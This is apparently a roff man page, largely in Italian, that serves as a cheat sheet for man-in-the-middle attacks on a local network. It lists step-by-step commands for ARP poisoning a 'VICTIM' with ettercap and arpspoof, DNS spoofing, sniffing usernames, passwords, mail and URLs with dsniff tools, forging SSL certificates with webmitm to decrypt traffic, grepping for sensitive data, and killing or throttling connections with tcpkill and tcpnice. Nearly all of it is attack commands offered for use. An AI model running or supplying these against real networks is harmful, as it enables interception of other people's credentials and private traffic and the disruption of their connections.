.\" generated with Ronn/v0.7.3
.\" http://github.com/rtomayko/ronn/tree/0.7.3
.
.TH "MITM" "1" "February 2014" "Filippo Squillace" "mitm"
.
.SH "sysctl"
To displays all the output(parameters): \fBsysctl \-a\fR
.
.P
To do changes with the appropriate command: \fBsudo sysctl \-w parameter=value\fR
.
.P
For example: \fBsudo sysctl \-w net\.ipv4\.ip_forward=1\fR
.
.P
To load the value into kernel and become live: \fBsysctl \-a\fR
.
.SH "ettercap \- mitm"
Non c\'è bisogno di abilitare l\'inoltro ip ma basta semplicemente eseguire il comando dopo la config di /etc/etter\.conf
.
.P
\fBsudo ettercap \-Tqi wlan0 \-M arp:remote /VICTIM/ /GW/\fR
.
.P
ATTENZIONE: Non provare SSL utilizando il bridged mode in quanto non funziona\. ATTENZIONE: Non usare ip_forward=1 in quanto si rischierebbe di inviare duplicati(Vedere la descrizione di man ettercap per ulterior dettagli)\. ATTENZIONE: Assicurarsi di avere installato iptables altrimenti non funzionerebbe il forward\.
.
.P
To check if ARP poison is working well try: \fBarp \-a\fR
.
.SH "ettercap \- dns_spoof"
Modifica il file /usr/share/ettercap/etter\.dns inserendo una regola del tipo: * A 127\.0\.0\.1 per inoltrare tutti i dns al localhost Attivare il plugin dns_spoof
.
.SH "ettercap \- remote_browser"
Serve per conoscere le pagine visitate dall\'utente\. Specificare il browser da usare su /etc/etter\.conf
.
.SH "man in the middle (mitm)"
Per abilitare l\'inoltro dei pacchetti fare in questo modo (da non utilizzare con il comando fragrouter): \fBecho 1 > /proc/sys/net/ipv4/ip\-forward\fR
.
.P
Se non funziona provare: \fBsudo sysctl \-w net\.ipv4\.ip_forward=0\fR
.
.P
La prima operazione da fare è il comando arpspoof\. Consideriamo i seguenti IP: IP_VICTIM è l\'IP della vittima e IP_SERVER\. I comandi da eseguire sono: \fBarpspoof \-t IP_VICTIM IP_SERVER\fR e \fBarpspoof \-t IP_SERVER IP_VICTIM\fR
.
.P
La successiva operazione è fare in modo che il mitm possa inoltrare effettivamente i pacchetti in transito: \fBfragrouter \-B1\fR
.
.SH "sniffing"
Questa è un operazione che va fatta una volta che il pc è in mitm!! Il comando capace di sniffare user e pass di moltissimi protocolli è: \fBdsniff \-i eth0 \-md\fR
.
.P
L\'opzione \-m consente il controllo automatico dei protocolli e \-d è il debugging mode\. Un\'altro comando che spesso viene adoperato è: \fBngrep host IP\fR
.
.P
Dove IP è l\'indirizzo IP della vittima\.
.
.P
Gli comandi di sniffing sono: Sniffa mail e li pone in output ben formattati: \fBmailsnarf\fR
.
.P
Sniffa URL: \fBurlsnarf\fR
.
.P
Sniffa messaggi su IRC, MSN etc: \fBmsgsnarf\fR
.
.P
Sniffa file su NFS: \fBfilesnarf\fR
.
.P
Manda gli URL sniffati al proprio browser locale: \fBwebspy\fR
.
.SH "SSL mitm"
Questa è un operazione che va fatta una volta che il pc è in mitm!! Questa procedura consente di ottenere falsificare i certificati che vengono trasmessi via HTTP, POP, SMTP o qualunque altro protocollo che si poggia sul SSL\. La prima operazione è redirezionare il traffico HTTP/HTTPS tramite: \fBdnsspoof\fR
.
.P
Successivamente occorre falsificare il certificato tramite il comando: \fBwebmitm\fR
.
.P
A questo punto il comando webmitm restituirà il falso certificato (webmitm\.crt) che potrà essere utilizzato per decifrare il traffico SSL sniffato tramite wireshark (ethereal) e posto in un file\. Quindi: \fBssldump \-r ozzy \-k webmitm\.crt \-d > outozzy\fR
.
.P
con \-r specifichiamo il dumpfile, \-k è la chiave, \-d indica di decifrare i dati Rimane solo da interpretare i dati ormai decifrati: \fBcat outozzy | grep ??\fR
.
.P
In grep si può mettere qualcosa che possa filtrare i dati in modo da ottenere più facilmente i dati sensibili\. Per esempio si può inserire il nome di qualche tag html vicino ai dati sensibili\.
.
.SH "kill and slow down connection with tcpkill and tcpnice"
Se vogliamo chiudere le connessioni TCP su porta 22 (SSH): \fBtcpkill \-i eth0 tcp port 22\fR
.
.P
If you want to kill all the connections but not for a pecified host: \fBsudo tcpkill \-i wlan0 \-9 not host 192\.168\.1\.109\fR
.
.P
Se vogliamo rallentare una connessione TCP iniettando pacchetti che avvisano di una finestra di ricezione piccola o pacchetti ICMP: \fBtcpnice \-i eth0 tcp port 22\fR
.
.P
To slow down all the connection but not for a specified host: \fBsudo tcpnice \-i wlan0 not host 192\.168\.1\.109\fR
